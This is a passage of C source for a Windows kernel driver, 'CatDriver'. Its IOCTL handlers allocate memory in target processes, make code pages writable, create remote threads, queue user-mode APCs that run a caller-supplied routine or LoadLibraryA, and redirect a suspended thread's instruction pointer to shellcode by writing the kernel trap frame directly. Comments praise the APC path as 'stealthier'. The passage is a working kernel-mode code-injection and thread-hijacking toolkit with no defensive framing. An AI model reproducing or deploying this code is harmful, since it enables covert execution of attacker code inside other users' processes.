        if (!NT_SUCCESS(status)) {
            DbgPrint("[CatDriver] ALLOC: CatLookupLiveProcess(%u) failed: 0x%08X\n", pid, status);
            Irp->IoStatus.Information = 0;
            return status;
        }
        ObDereferenceObject(gateProc);
    }

    cid.UniqueProcess = (HANDLE)(ULONG_PTR)pid;
    cid.UniqueThread  = NULL;
    InitializeObjectAttributes(&oa, NULL, OBJ_KERNEL_HANDLE, NULL, NULL);

    status = ZwOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &oa, &cid);
    if (!NT_SUCCESS(status)) {
        DbgPrint("[CatDriver] ALLOC: ZwOpenProcess(%u) failed: 0x%08X\n", pid, status);
        Irp->IoStatus.Information = 0;
        return status;
    }

    PVOID  baseAddr   = NULL;
    SIZE_T regionSize = sz;

    status = ZwAllocateVirtualMemory(
        hProcess, &baseAddr, 0, &regionSize,
        MEM_COMMIT | MEM_RESERVE, prot
    );

    ZwClose(hProcess);

    response = (PCAT_ALLOC_RESPONSE)Irp->AssociatedIrp.SystemBuffer;

    if (NT_SUCCESS(status)) {
        response->AllocatedAddress = (ULONGLONG)baseAddr;
        response->AllocatedSize    = (ULONG)regionSize;
        DbgPrint("[CatDriver] ALLOC: PID %u -> 0x%llX (%u bytes, prot=0x%X)\n",
                 pid, (ULONGLONG)baseAddr, (ULONG)regionSize, prot);
    } else {
        response->AllocatedAddress = 0;
        response->AllocatedSize    = 0;
        DbgPrint("[CatDriver] ALLOC: ZwAllocateVirtualMemory failed: 0x%08X\n", status);
    }

    Irp->IoStatus.Information = CAT_ALLOC_OUTPUT_SIZE;
    return status;
}


/* ================================================================
 * CatProtectMem — flip page protection in target process
 *
 * Needed for writing to .text (PAGE_EXECUTE_READ) — the standard
 * MmCopyVirtualMemory path with KernelMode still respects PTE
 * protection, so we have to change the pages to _READWRITE first.
 *
 * ZwProtectVirtualMemory isn't in the standard WDK headers; resolve
 * via MmGetSystemRoutineAddress (same pattern the driver uses for
 * ZwCreateThreadEx and KeAlertThread).
 * ================================================================ */

typedef NTSTATUS (NTAPI *PFN_ZwProtectVirtualMemory)(
    IN  HANDLE      ProcessHandle,
    IN OUT PVOID*   BaseAddress,
    IN OUT PSIZE_T  RegionSize,
    IN  ULONG       NewProtection,
    OUT PULONG      OldProtection
);
static PFN_ZwProtectVirtualMemory pfnZwProtectVirtualMemory = NULL;

static NTSTATUS CatProtectMem(PIRP Irp, PIO_STACK_LOCATION IoStack)
{
    PCAT_PROTECT_REQUEST  request;
    PCAT_PROTECT_RESPONSE response;
    NTSTATUS              status;
    HANDLE                hProcess = NULL;
    OBJECT_ATTRIBUTES     oa;
    CLIENT_ID             cid;

    if (IoStack->Parameters.DeviceIoControl.InputBufferLength < CAT_PROTECT_INPUT_SIZE ||
        IoStack->Parameters.DeviceIoControl.OutputBufferLength < CAT_PROTECT_OUTPUT_SIZE) {
        Irp->IoStatus.Information = 0;
        return STATUS_BUFFER_TOO_SMALL;
    }

    request = (PCAT_PROTECT_REQUEST)Irp->AssociatedIrp.SystemBuffer;

    if (request->Size == 0 || request->Size > CAT_MAX_TRANSFER_SIZE) {
        Irp->IoStatus.Information = 0;
        return STATUS_INVALID_PARAMETER;
    }

    if (!CatIsValidUserVa(request->Address, request->Size)) {
        DbgPrint("[CatDriver] PROTECT: rejected bogus VA 0x%llX (size %u)\n",
                 request->Address, request->Size);
        Irp->IoStatus.Information = 0;
        return STATUS_INVALID_PARAMETER;
    }

    /* Cache Zw addresses because SystemBuffer is shared in/out. */
    ULONG pid     = request->ProcessId;
    PVOID baseVa  = (PVOID)(ULONG_PTR)request->Address;
    SIZE_T sizeSz = (SIZE_T)request->Size;
    ULONG newProt = request->NewProtection;

    /* Resolve ZwProtectVirtualMemory on first use. */
    if (!pfnZwProtectVirtualMemory) {
        UNICODE_STRING name;
        RtlInitUnicodeString(&name, L"ZwProtectVirtualMemory");
        pfnZwProtectVirtualMemory =
            (PFN_ZwProtectVirtualMemory)MmGetSystemRoutineAddress(&name);
        if (!pfnZwProtectVirtualMemory) {
            DbgPrint("[CatDriver] PROTECT: ZwProtectVirtualMemory not exported\n");
            response = (PCAT_PROTECT_RESPONSE)Irp->AssociatedIrp.SystemBuffer;
            response->OldProtection = 0;
            response->NtStatus      = STATUS_NOT_FOUND;
            Irp->IoStatus.Information = CAT_PROTECT_OUTPUT_SIZE;
            return STATUS_NOT_FOUND;
        }
    }

    /* Live/PP/PPL gate before Zw-opening the target handle. */
    {
        PEPROCESS gateProc = NULL;
        status = CatLookupLiveProcess(pid, &gateProc);
        if (!NT_SUCCESS(status)) {
            DbgPrint("[CatDriver] PROTECT: CatLookupLiveProcess(%u) failed: 0x%08X\n", pid, status);
            response = (PCAT_PROTECT_RESPONSE)Irp->AssociatedIrp.SystemBuffer;
            response->OldProtection = 0;
            response->NtStatus      = status;
            Irp->IoStatus.Information = CAT_PROTECT_OUTPUT_SIZE;
            return status;
        }
        ObDereferenceObject(gateProc);
    }

    cid.UniqueProcess = (HANDLE)(ULONG_PTR)pid;
    cid.UniqueThread  = NULL;
    InitializeObjectAttributes(&oa, NULL, OBJ_KERNEL_HANDLE, NULL, NULL);

    status = ZwOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &oa, &cid);
    if (!NT_SUCCESS(status)) {
        DbgPrint("[CatDriver] PROTECT: ZwOpenProcess(%u) failed: 0x%08X\n", pid, status);
        response = (PCAT_PROTECT_RESPONSE)Irp->AssociatedIrp.SystemBuffer;
        response->OldProtection = 0;
        response->NtStatus      = status;
        Irp->IoStatus.Information = CAT_PROTECT_OUTPUT_SIZE;
        return status;
    }

    /* Sanitize NewProtection -- reject bogus flags so we can't ever hand
     * ZwProtectVirtualMemory a value that trips an internal assertion. */
    {
        const ULONG kValidProt =
            PAGE_NOACCESS | PAGE_READONLY | PAGE_READWRITE | PAGE_WRITECOPY |
            PAGE_EXECUTE  | PAGE_EXECUTE_READ | PAGE_EXECUTE_READWRITE |
            PAGE_EXECUTE_WRITECOPY | PAGE_GUARD | PAGE_NOCACHE | PAGE_WRITECOMBINE;
        if ((newProt & ~kValidProt) != 0 || newProt == 0) {
            DbgPrint("[CatDriver] PROTECT: rejected bad prot 0x%X\n", newProt);
            response = (PCAT_PROTECT_RESPONSE)Irp->AssociatedIrp.SystemBuffer;
            response->OldProtection = 0;
            response->NtStatus      = STATUS_INVALID_PAGE_PROTECTION;
            Irp->IoStatus.Information = CAT_PROTECT_OUTPUT_SIZE;
            ZwClose(hProcess);
            return STATUS_INVALID_PAGE_PROTECTION;
        }
    }

    ULONG oldProt = 0;
    /* __try/__except so a bad page state in the target can't take the
     * whole box down -- catches AV, misalignment, torn VAD, etc. */
    __try {
        status = pfnZwProtectVirtualMemory(hProcess, &baseVa, &sizeSz, newProt, &oldProt);
    } __except (EXCEPTION_EXECUTE_HANDLER) {
        status = GetExceptionCode();
        DbgPrint("[CatDriver] PROTECT: exception 0x%08X in ZwProtectVirtualMemory\n", status);
    }
    ZwClose(hProcess);

    response = (PCAT_PROTECT_RESPONSE)Irp->AssociatedIrp.SystemBuffer;
    if (NT_SUCCESS(status)) {
        response->OldProtection = oldProt;
        response->NtStatus      = status;
        DbgPrint("[CatDriver] PROTECT: PID %u addr 0x%llX size %llu prot 0x%X -> 0x%X (was 0x%X)\n",
            pid, (ULONGLONG)(ULONG_PTR)baseVa, (ULONGLONG)sizeSz,
            newProt, newProt, oldProt);
    } else {
        response->OldProtection = 0;
        response->NtStatus      = status;
        DbgPrint("[CatDriver] PROTECT: ZwProtectVirtualMemory failed: 0x%08X\n", status);
    }

    Irp->IoStatus.Information = CAT_PROTECT_OUTPUT_SIZE;
    return status;
}


/* ================================================================
 * CatCreateThread — create a user-mode thread in target process
 *
 * Resolves ZwCreateThreadEx dynamically, opens the process,
 * creates a thread at the specified start address with parameter.
 * ================================================================ */

typedef NTSTATUS (NTAPI *PFN_ZwCreateThreadEx)(
    OUT PHANDLE         ThreadHandle,
    IN  ACCESS_MASK     DesiredAccess,
    IN  POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,
    IN  HANDLE          ProcessHandle,
    IN  PVOID           StartRoutine,
    IN  PVOID           Argument OPTIONAL,
    IN  ULONG           CreateFlags,
    IN  SIZE_T          ZeroBits,
    IN  SIZE_T          StackSize,
    IN  SIZE_T          MaximumStackSize,
    IN  PVOID           AttributeList OPTIONAL
);

static NTSTATUS CatCreateThread(PIRP Irp, PIO_STACK_LOCATION IoStack)
{
    PCAT_THREAD_REQUEST  request;
    PCAT_THREAD_RESPONSE response;
    NTSTATUS             status;
    HANDLE               hProcess = NULL;
    HANDLE               hThread  = NULL;
    OBJECT_ATTRIBUTES    oa;
    CLIENT_ID            cid;
    UNICODE_STRING       fnName;

    if (IoStack->Parameters.DeviceIoControl.InputBufferLength < CAT_THREAD_INPUT_SIZE ||
        IoStack->Parameters.DeviceIoControl.OutputBufferLength < CAT_THREAD_OUTPUT_SIZE) {
        Irp->IoStatus.Information = 0;
        return STATUS_BUFFER_TOO_SMALL;
    }

    request = (PCAT_THREAD_REQUEST)Irp->AssociatedIrp.SystemBuffer;

    ULONG     pid       = request->ProcessId;
    ULONGLONG startAddr = request->StartAddress;
    ULONGLONG param     = request->Parameter;

    /* StartAddress is the new thread's RIP; a kernel VA here would get
     * executed in user mode on first dispatch and bugcheck the box on
     * sysret. Parameter can be anything (first arg to the thread), but
     * if it's intended to be a pointer the caller must pass a sane one;
     * we don't enforce it. */
    if (!CatIsValidUserVa(startAddr, 1)) {
        DbgPrint("[CatDriver] THREAD: rejected bogus StartAddress 0x%llX\n", startAddr);
        Irp->IoStatus.Information = 0;
        return STATUS_INVALID_PARAMETER;
    }

    /* Pre-flight the PID through the live/PP/PPL gate before letting Zw
     * open a kernel handle to it. ZwOpenProcess by itself happily opens
     * PPL processes from kernel. */
    {
        PEPROCESS gateProc = NULL;
        status = CatLookupLiveProcess(pid, &gateProc);
        if (!NT_SUCCESS(status)) {
            DbgPrint("[CatDriver] THREAD: CatLookupLiveProcess(%u) failed: 0x%08X\n", pid, status);
            Irp->IoStatus.Information = 0;
            return status;
        }
        ObDereferenceObject(gateProc);
    }

    /* Resolve ZwCreateThreadEx dynamically */
    RtlInitUnicodeString(&fnName, L"ZwCreateThreadEx");
    PFN_ZwCreateThreadEx pZwCreateThreadEx =
        (PFN_ZwCreateThreadEx)MmGetSystemRoutineAddress(&fnName);

    if (!pZwCreateThreadEx) {
        DbgPrint("[CatDriver] THREAD: ZwCreateThreadEx not found!\n");
        Irp->IoStatus.Information = 0;
        return STATUS_NOT_FOUND;
    }

    cid.UniqueProcess = (HANDLE)(ULONG_PTR)pid;
    cid.UniqueThread  = NULL;
    InitializeObjectAttributes(&oa, NULL, OBJ_KERNEL_HANDLE, NULL, NULL);

    status = ZwOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &oa, &cid);
    if (!NT_SUCCESS(status)) {
        DbgPrint("[CatDriver] THREAD: ZwOpenProcess(%u) failed: 0x%08X\n", pid, status);
        Irp->IoStatus.Information = 0;
        return status;
    }

    InitializeObjectAttributes(&oa, NULL, OBJ_KERNEL_HANDLE, NULL, NULL);

    status = pZwCreateThreadEx(
        &hThread,
        THREAD_ALL_ACCESS,
        &oa,
        hProcess,
        (PVOID)startAddr,
        (PVOID)param,
        0,      /* CreateFlags: 0 = run immediately */
        0,      /* ZeroBits */
        0,      /* StackSize (0 = default) */
        0,      /* MaximumStackSize (0 = default) */
        NULL    /* AttributeList */
    );

    if (NT_SUCCESS(status)) {
        /* ZwCreateThreadEx returned a kernel handle to the new thread. We
         * briefly reference-count the ETHREAD to resolve the TID, then
         * drop the ref and close the kernel handle. From this point the
         * ETHREAD is owned by its user-mode run: the caller receives the
         * TID back and is responsible for whatever lifecycle management
         * they need (OpenThread + Suspend / Terminate from user mode). */
        PETHREAD threadObj = NULL;
        ULONG tid = 0;
        NTSTATUS refStat = ObReferenceObjectByHandle(
            hThread, 0, *PsThreadType, KernelMode,
            (PVOID*)&threadObj, NULL
        );
        if (NT_SUCCESS(refStat)) {
            tid = (ULONG)(ULONG_PTR)PsGetThreadId(threadObj);
            ObDereferenceObject(threadObj);
        }
        ZwClose(hThread);

        DbgPrint("[CatDriver] THREAD: Created TID %u in PID %u at 0x%llX\n",
                 tid, pid, startAddr);

        response = (PCAT_THREAD_RESPONSE)Irp->AssociatedIrp.SystemBuffer;
        response->ThreadId = tid;
    } else {
        DbgPrint("[CatDriver] THREAD: ZwCreateThreadEx failed: 0x%08X\n", status);
        response = (PCAT_THREAD_RESPONSE)Irp->AssociatedIrp.SystemBuffer;
        response->ThreadId = 0;
    }

    ZwClose(hProcess);
    Irp->IoStatus.Information = CAT_THREAD_OUTPUT_SIZE;
    return status;
}

/* ================================================================
 * CatApcInject — queue user-mode APC on existing thread
 *
 * Stealthier than thread creation: no new threads, just queues
 * a function call on an existing thread. The APC fires when the
 * thread enters an alertable wait (which GUI/render threads do
 * constantly). LoadLibraryA(dllPath) as the APC routine works
 * because x64 calling convention: first param in RCX = NormalContext.
 * ================================================================ */

static VOID NTAPI CatApcKernelRoutine(
    PKAPC Apc,
    PCAT_KNORMAL_ROUTINE *NormalRoutine,
    PVOID *NormalContext,
    PVOID *SystemArgument1,
    PVOID *SystemArgument2)
{
    UNREFERENCED_PARAMETER(NormalRoutine);
    UNREFERENCED_PARAMETER(NormalContext);
    UNREFERENCED_PARAMETER(SystemArgument1);
    UNREFERENCED_PARAMETER(SystemArgument2);
    ExFreePoolWithTag(Apc, 'tapC');
}

static VOID NTAPI CatApcRundownRoutine(PKAPC Apc)
{
    ExFreePoolWithTag(Apc, 'tapC');
}

static NTSTATUS CatApcInject(PIRP Irp, PIO_STACK_LOCATION IoStack)
{
    PCAT_APC_REQUEST   request;
    PCAT_APC_RESPONSE  response;
    PETHREAD           thread = NULL;
    PKAPC              apc    = NULL;
    NTSTATUS           status;
    BOOLEAN            inserted;

    if (IoStack->Parameters.DeviceIoControl.InputBufferLength < CAT_APC_INPUT_SIZE ||
        IoStack->Parameters.DeviceIoControl.OutputBufferLength < CAT_APC_OUTPUT_SIZE) {
        Irp->IoStatus.Information = 0;
        return STATUS_BUFFER_TOO_SMALL;
    }

    request  = (PCAT_APC_REQUEST)Irp->AssociatedIrp.SystemBuffer;
    response = (PCAT_APC_RESPONSE)Irp->AssociatedIrp.SystemBuffer;

    ULONG     pid       = request->ProcessId;
    ULONG     tid       = request->ThreadId;
    ULONGLONG apcFunc   = request->ApcRoutine;
    ULONGLONG apcArg    = request->ApcArgument;

    DbgPrint("[CatDriver] APC: Targeting TID %u, Routine=0x%llX, Arg=0x%llX\n",
             tid, apcFunc, apcArg);

    /* Validate ApcRoutine as a user VA — if fuzzer passes a kernel VA, the
     * APC dispatches to kernel code in user mode and bugchecks on sysret
     * (0x3B / 0x1E / 0x7F depending on CR0.SMEP state). */
    if (!CatIsValidUserVa(apcFunc, 1)) {
        DbgPrint("[CatDriver] APC: rejected bogus ApcRoutine 0x%llX\n", apcFunc);
        response->Queued   = 0;
        response->NtStatus = (LONG)STATUS_INVALID_PARAMETER;
        Irp->IoStatus.Information = CAT_APC_OUTPUT_SIZE;
        return STATUS_INVALID_PARAMETER;
    }

    status = CatLookupLiveThread(tid, pid, &thread);
    if (!NT_SUCCESS(status)) {
        DbgPrint("[CatDriver] APC: CatLookupLiveThread(%u, pid=%u) failed: 0x%08X\n",
                 tid, pid, status);
        response->Queued   = 0;
        response->NtStatus = status;
        Irp->IoStatus.Information = CAT_APC_OUTPUT_SIZE;
        return STATUS_SUCCESS;
    }

    apc = (PKAPC)ExAllocatePoolWithTag(NonPagedPool, sizeof(KAPC), 'tapC');
    if (!apc) {
        DbgPrint("[CatDriver] APC: Failed to allocate KAPC\n");
        ObDereferenceObject(thread);
        response->Queued   = 0;
        response->NtStatus = STATUS_INSUFFICIENT_RESOURCES;
        Irp->IoStatus.Information = CAT_APC_OUTPUT_SIZE;
        return STATUS_SUCCESS;
    }

    /* R0 row #5: KernelRoutine MUST be non-NULL — KeInsertQueueApc calls it
     * during dispatch and a NULL deref there is a 0x1E past KiDeliverApc. */
    NT_ASSERT(CatApcKernelRoutine != NULL);
    KeInitializeApc(
        apc,
        (PKTHREAD)thread,
        OriginalApcEnvironment,
        CatApcKernelRoutine,
        CatApcRundownRoutine,
        (PCAT_KNORMAL_ROUTINE)(ULONG_PTR)apcFunc,
        UserMode,
        (PVOID)(ULONG_PTR)apcArg
    );

    inserted = KeInsertQueueApc(apc, NULL, NULL, IO_NO_INCREMENT);

    if (inserted) {
        DbgPrint("[CatDriver] APC: Queued to TID %u\n", tid);
    } else {
        DbgPrint("[CatDriver] APC: KeInsertQueueApc failed for TID %u\n", tid);
        ExFreePoolWithTag(apc, 'tapC');
    }

    ObDereferenceObject(thread);

    response->Queued   = inserted ? 1 : 0;
    response->NtStatus = inserted ? 0 : (LONG)STATUS_UNSUCCESSFUL;
    Irp->IoStatus.Information = CAT_APC_OUTPUT_SIZE;
    return STATUS_SUCCESS;
}

/* ================================================================
 * CatSpecialApc — SAFE version: standard APC + KeAlertThread
 *
 * Prior attempt with NULL KernelRoutine BSOD'd (KMODE 0x1E) because
 * KeInsertQueueApc calls KernelRoutine during processing.
 *
 * Safe strategy: queue a normal user APC (works without crash, proven
 * by IOCTL_CAT_APC_INJECT), then KeAlertThread to force the thread
 * out of any current alertable wait AND mark it alerted so the NEXT
 * alertable wait returns immediately with STATUS_ALERTED, triggering
 * APC dispatch.
 *
 * KeAlertThread is exported by ntoskrnl (undocumented but stable).
 * ================================================================ */

typedef NTSTATUS (NTAPI *PFN_KeAlertThread)(PKTHREAD Thread, KPROCESSOR_MODE AlertMode);
static PFN_KeAlertThread pfnKeAlertThread = NULL;

static NTSTATUS CatSpecialApc(PIRP Irp, PIO_STACK_LOCATION IoStack)
{
    PCAT_APC_REQUEST   request;
    PCAT_APC_RESPONSE  response;
    PETHREAD           thread = NULL;
    PKAPC              apc    = NULL;
    NTSTATUS           status;
    BOOLEAN            inserted;

    if (IoStack->Parameters.DeviceIoControl.InputBufferLength < CAT_APC_INPUT_SIZE ||
        IoStack->Parameters.DeviceIoControl.OutputBufferLength < CAT_APC_OUTPUT_SIZE) {
        Irp->IoStatus.Information = 0;
        return STATUS_BUFFER_TOO_SMALL;
    }

    request  = (PCAT_APC_REQUEST)Irp->AssociatedIrp.SystemBuffer;
    response = (PCAT_APC_RESPONSE)Irp->AssociatedIrp.SystemBuffer;

    ULONG     pid       = request->ProcessId;
    ULONG     tid       = request->ThreadId;
    ULONGLONG apcFunc   = request->ApcRoutine;
    ULONGLONG apcArg    = request->ApcArgument;

    DbgPrint("[CatDriver] SPECAPC: TID %u, Routine=0x%llX, Arg=0x%llX\n",
             tid, apcFunc, apcArg);

    /* Same user-VA guard as CatApcInject. */
    if (!CatIsValidUserVa(apcFunc, 1)) {
        DbgPrint("[CatDriver] SPECAPC: rejected bogus ApcRoutine 0x%llX\n", apcFunc);
        response->Queued   = 0;
        response->NtStatus = (LONG)STATUS_INVALID_PARAMETER;
        Irp->IoStatus.Information = CAT_APC_OUTPUT_SIZE;
        return STATUS_INVALID_PARAMETER;
    }

    /* Build gate: the KAPC_STATE scan below finds a Process pointer in
     * KTHREAD and infers the ApcState layout. The "Process + 0x08 ==
     * KernelApcInProgress BOOLEAN" anchor only reliably excludes false
     * positives on known KTHREAD layouts. On an unexpected build, a
     * random KTHREAD field matching the Process pointer with a 0/1 byte
     * at +0x08 passes the check and the byte-OR corrupts scheduler state.
     * Refuse outright on unknown builds — the scan is a 24H2+ specific
     * trick, not a universal pattern. */
    if (g_OsBuildNumber != 26100 && g_OsBuildNumber != 26200) {
        DbgPrint("[CatDriver] SPECAPC: OS build %u not in known-good set — refuse\n",
                 g_OsBuildNumber);
        response->Queued   = 0;
        response->NtStatus = (LONG)STATUS_NOT_SUPPORTED;
        Irp->IoStatus.Information = CAT_APC_OUTPUT_SIZE;
        return STATUS_NOT_SUPPORTED;
    }

    /* Lazy-resolve KeAlertThread */
    if (!pfnKeAlertThread) {
        UNICODE_STRING name;
        RtlInitUnicodeString(&name, L"KeAlertThread");
        pfnKeAlertThread = (PFN_KeAlertThread)MmGetSystemRoutineAddress(&name);
    }

    status = CatLookupLiveThread(tid, pid, &thread);
    if (!NT_SUCCESS(status)) {
        response->Queued = 0;
        response->NtStatus = status;
        Irp->IoStatus.Information = CAT_APC_OUTPUT_SIZE;
        return STATUS_SUCCESS;
    }

    apc = (PKAPC)ExAllocatePoolWithTag(NonPagedPool, sizeof(KAPC), 'tapS');
    if (!apc) {
        ObDereferenceObject(thread);
        response->Queued = 0;
        response->NtStatus = STATUS_INSUFFICIENT_RESOURCES;
        Irp->IoStatus.Information = CAT_APC_OUTPUT_SIZE;
        return STATUS_SUCCESS;
    }

    /* R0 row #5: KernelRoutine MUST be non-NULL (0x1E past KiDeliverApc). */
    NT_ASSERT(CatApcKernelRoutine != NULL);
    /* SAFE: real kernel routine, no NULL pointers, no bit hacks */
    KeInitializeApc(
        apc,
        (PKTHREAD)thread,
        OriginalApcEnvironment,
        CatApcKernelRoutine,                          /* real routine — frees apc */
        CatApcRundownRoutine,                         /* real rundown */
        (PCAT_KNORMAL_ROUTINE)(ULONG_PTR)apcFunc,     /* shellcode */
        UserMode,
        (PVOID)(ULONG_PTR)apcArg                      /* RCX = params */
    );

    inserted = KeInsertQueueApc(apc, NULL, NULL, IO_NO_INCREMENT);

    if (inserted) {
        /* Find KAPC_STATE by locating its Process field (a known PEPROCESS).
         * KAPC_STATE.Process is at offset +0x20 within KAPC_STATE.
         * So if we find Process at KTHREAD+procOff, ApcState starts at procOff-0x20.
         * UserApcPendingAll is at ApcState_start + 0x2A = procOff - 0x16. */
        PEPROCESS targetProc = PsGetThreadProcess((PETHREAD)thread);
        UCHAR pendBefore = 0xFF, pendAfter = 0xFF;
        ULONG procOff = 0;
        ULONG apcStateStart = 0;
        ULONG pendOff = 0;
        /* Raise to DISPATCH across the KAPC_STATE scan + byte-OR so the
         * scheduler can't context-switch away from the target thread's
         * APC-processing path on our CPU mid-store. Target thread may
         * still be dispatched on another CPU — this is a reduction, not
         * elimination. */
        KIRQL spIrql;
        KeRaiseIrql(DISPATCH_LEVEL, &spIrql);
        __try {
            for (ULONG off = 0x80; off <= 0x180; off += 8) {
                PEPROCESS p = *(PEPROCESS*)((PUCHAR)thread + off);
                if (p != targetProc) continue;
                /* R0 row #8: second-anchor against false positives.
                 * KAPC_STATE.KernelApcInProgress at apcStateStart + 0x28
                 * (= off + 0x08 in KTHREAD coords) is a BOOLEAN byte (0/1)
                 * under normal operation. A random KTHREAD field matching
                 * targetProc with garbage at off+0x08 is rejected before
                 * we write to the ApcPending byte and corrupt the KTHREAD. */
                UCHAR apcInProg = *((PUCHAR)thread + off + 0x08);
                if (apcInProg > 1) continue;
                procOff = off;
                apcStateStart = off - 0x20;
                pendOff = apcStateStart + 0x2A;
                PUCHAR pPend = (PUCHAR)thread + pendOff;
                pendBefore = *pPend;
                InterlockedOr8((volatile CHAR*)pPend, 2);
                pendAfter = *pPend;
                DbgPrint("[CatDriver] SPECAPC: procOff=0x%X apcState=0x%X pendOff=0x%X 0x%02X->0x%02X (TID %u) [anchor=%u]\n",
                         procOff, apcStateStart, pendOff, pendBefore, pendAfter, tid, apcInProg);
                break;
            }
            if (procOff == 0) {
                DbgPrint("[CatDriver] SPECAPC: KAPC_STATE.Process NOT FOUND in TID %u (proc=%p)\n",
                         tid, targetProc);
            }
        } __except(EXCEPTION_EXECUTE_HANDLER) {
            DbgPrint("[CatDriver] SPECAPC: ApcState scan FAULTED for TID %u\n", tid);
        }
        KeLowerIrql(spIrql);

        if (pfnKeAlertThread) {
            pfnKeAlertThread((PKTHREAD)thread, UserMode);
            pfnKeAlertThread((PKTHREAD)thread, KernelMode);
        }
        DbgPrint("[CatDriver] SPECAPC: Queued to TID %u (pendOff=0x%X)\n", tid, pendOff);

        response->Queued   = 1;
        /* Encode: high16=pendOff, mid8=pendAfter, low8=pendBefore */
        response->NtStatus = (LONG)((pendOff << 16) | (pendAfter << 8) | pendBefore);
    } else {
        DbgPrint("[CatDriver] SPECAPC: KeInsertQueueApc failed for TID %u\n", tid);
        ExFreePoolWithTag(apc, 'tapS');
        response->Queued   = 0;
        response->NtStatus = (LONG)STATUS_UNSUCCESSFUL;
    }

    ObDereferenceObject(thread);
    Irp->IoStatus.Information = CAT_APC_OUTPUT_SIZE;
    return STATUS_SUCCESS;
}

/* ================================================================
 * CatHijackThread — suspend thread, redirect RIP to shellcode, resume
 *
 * The shellcode runs in the target thread's user-mode context.
 * We save the original RIP into the params struct so the caller
 * can read it back. The shellcode is responsible for its own
 * cleanup and should not try to return to the original RIP
 * (the thread will be in an unpredictable state after).
 *
 * We write original context fields directly into the params
 * struct via MmCopyVirtualMemory so the shellcode can restore
 * registers if needed.
 * ================================================================ */

/* The hijack path uses direct trap-frame writes rather than PsSuspendThread
 * / PsSetContextThread, so those APIs are no longer resolved here. The
 * freeze/thaw path (CatFreezeProcess / CatThawProcess) resolves
 * PsSuspendProcess / PsResumeProcess at its own call site. */

static NTSTATUS CatHijackThread(PIRP Irp, PIO_STACK_LOCATION IoStack)
{
    PCAT_HIJACK_REQUEST  request;
    PCAT_HIJACK_RESPONSE response;
    NTSTATUS             status = STATUS_SUCCESS;
    PETHREAD             thread = NULL;
    PEPROCESS            process = NULL;
    ULONGLONG            origRip = 0;

    if (IoStack->Parameters.DeviceIoControl.InputBufferLength < CAT_HIJACK_INPUT_SIZE ||
        IoStack->Parameters.DeviceIoControl.OutputBufferLength < CAT_HIJACK_OUTPUT_SIZE) {
        Irp->IoStatus.Information = 0;
        return STATUS_BUFFER_TOO_SMALL;
    }

    request  = (PCAT_HIJACK_REQUEST)Irp->AssociatedIrp.SystemBuffer;
    response = (PCAT_HIJACK_RESPONSE)Irp->AssociatedIrp.SystemBuffer;

    ULONG     pid           = request->ProcessId;
    ULONG     tid           = request->ThreadId;
    ULONGLONG shellcodeAddr = request->ShellcodeAddr;
    ULONGLONG paramsAddr    = request->ParamsAddr;

    DbgPrint("[CatDriver] HIJACK: TID %u, Code=0x%llX, Params=0x%llX\n",
             tid, shellcodeAddr, paramsAddr);

    /* HARD gate: refuse unless TrapFrame offset was ACTUALLY discovered.
     * CatGetTrapFrameOff falls back to 0x90 (26200) and the raw offset read
     * at CatHijackThread will dereference garbage on any other build — 0x50.
     * Diagnostic paths still get the fallback; this one does not. */
    if (!CatTrapFrameOffDiscovered()) {
        DbgPrint("[CatDriver] HIJACK: TrapFrame offset not discovered — refuse\n");
        status = STATUS_NOT_READY;
        goto bail;
    }

    /* Shellcode and params must be legal user VAs. Fuzzer-safe: a bogus
     * ShellcodeAddr becomes RIP on sysret and the kernel either bugchecks
     * (kernel VA) or GPFs (non-canonical). ParamsAddr is user shellcode's
     * RCX — just as critical. */
    if (!CatIsValidUserVa(shellcodeAddr, 1) || !CatIsValidUserVa(paramsAddr, 1)) {
        DbgPrint("[CatDriver] HIJACK: rejected bogus VA (sc=0x%llX pm=0x%llX)\n",
                 shellcodeAddr, paramsAddr);
        status = STATUS_INVALID_PARAMETER;
        goto bail;
    }

    /* Owner-checked, PP/PPL-rejected, live-checked thread lookup. If TID
     * belongs to a different PID than claimed, we refuse — stops a fuzzer
     * from pairing a random TID with a different PID's trap frame. */
    status = CatLookupLiveThread(tid, pid, &thread);
    if (!NT_SUCCESS(status)) {
        DbgPrint("[CatDriver] HIJACK: CatLookupLiveThread failed: 0x%08X\n", status);
        thread = NULL;
        goto bail;
    }
    status = CatLookupLiveProcess(pid, &process);
    if (!NT_SUCCESS(status)) {
        DbgPrint("[CatDriver] HIJACK: CatLookupLiveProcess failed: 0x%08X\n", status);
        process = NULL;
        goto bail;
    }

    /* NO INNER FREEZE — caller holds the freeze via IOCTL_CAT_FREEZE_PROCESS
     * before issuing hijack IOCTLs, then thaws after. Nesting Suspend/
     * ResumeProcess here was the source of a STATUS_INVALID_CID race.
     *
     * DIRECT TRAPFRAME WRITE — bypasses PsSetContextThread entirely.
     *   KTHREAD.TrapFrame offset: runtime-discovered (fallback 0x90)
     *   KTRAP_FRAME.Rip offset:   0x168
     *   KTRAP_FRAME.Rcx offset:   0x38   (NOT 0x90 — that's Xmm0)
     */
    const LONG tfOff = CatGetTrapFrameOff();
    PVOID trapFrame = NULL;

    /* Read the TrapFrame pointer under SEH — if KTHREAD layout is off on
     * this build, the deref faults and SEH catches at PASSIVE. MmIsAddress-
     * Valid was removed here: it is advisory and gave false confidence
     * (seen returning TRUE on pages that then bugcheck). Rely on __try. */
    __try {
        trapFrame = *(PVOID*)((PUCHAR)thread + tfOff);
    } __except (EXCEPTION_EXECUTE_HANDLER) {
        trapFrame = NULL;
        status = STATUS_INVALID_ADDRESS;
    }
    if (!NT_SUCCESS(status)) goto bail;
    if (!trapFrame || ((ULONG_PTR)trapFrame < 0xFFFF000000000000ULL)) {
        DbgPrint("[CatDriver] HIJACK: TrapFrame non-canonical: 0x%p\n", trapFrame);
        status = STATUS_INVALID_ADDRESS;
        goto bail;
    }

    /* Raise to DISPATCH across the read/write/verify window so this CPU
     * cannot context-switch mid-store. If the caller held the process
     * freeze (the documented invariant), the target thread is parked.
     * Otherwise this narrows (but doesn't eliminate) a cross-CPU race.
     * The verifyRip/verifyRcx readback is detection, not prevention. */
    ULONGLONG verifyRip = 0, verifyRcx = 0;
    KIRQL hijackIrql;
    KeRaiseIrql(DISPATCH_LEVEL, &hijackIrql);
    __try {
        origRip = *(ULONGLONG*)((PUCHAR)trapFrame + 0x168);
        *(ULONGLONG*)((PUCHAR)trapFrame + 0x168) = shellcodeAddr;
